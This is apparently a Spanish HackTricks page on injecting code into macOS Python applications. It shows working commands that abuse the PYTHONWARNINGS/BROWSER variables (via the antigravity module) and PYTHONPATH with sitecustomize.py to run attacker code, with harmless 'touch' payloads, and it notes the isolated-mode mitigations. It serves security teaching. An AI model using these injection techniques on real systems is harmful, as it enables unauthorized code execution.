# Inyección en aplicaciones Python de macOS

{{#include ../../../banners/hacktricks-training.md}}

## Mediante las variables de entorno `PYTHONWARNINGS` y `BROWSER`

Si un atacante puede controlar el entorno de un proceso Python, la combinación de `PYTHONWARNINGS` y `BROWSER` puede activar la ejecución de comandos cuando Python importa el módulo `antigravity` mientras procesa una opción de advertencia manipulada. La técnica depende de que `antigravity` abra una URL con el módulo `webbrowser` de Python, que respeta la variable de entorno `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Mediante `PYTHONPATH` y `sitecustomize.py`

Durante el inicio normal, el módulo `site` añade rutas específicas del sitio y luego intenta importar un módulo llamado `sitecustomize`. Al colocar primero un directorio legible por el atacante en `PYTHONPATH`, un atacante que controle el entorno del proceso puede hacer que Python importe un payload antes que el script objetivo. El indicador `-S` deshabilita la inicialización automática de `site`, mientras que el modo aislado (`-I`) ignora `PYTHONPATH` e implica `-s` y `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hacking con variables de entorno - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook de configuración específico del sitio](https://docs.python.org/3/library/site.html)
- [3] [Línea de comandos y entorno de Python](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
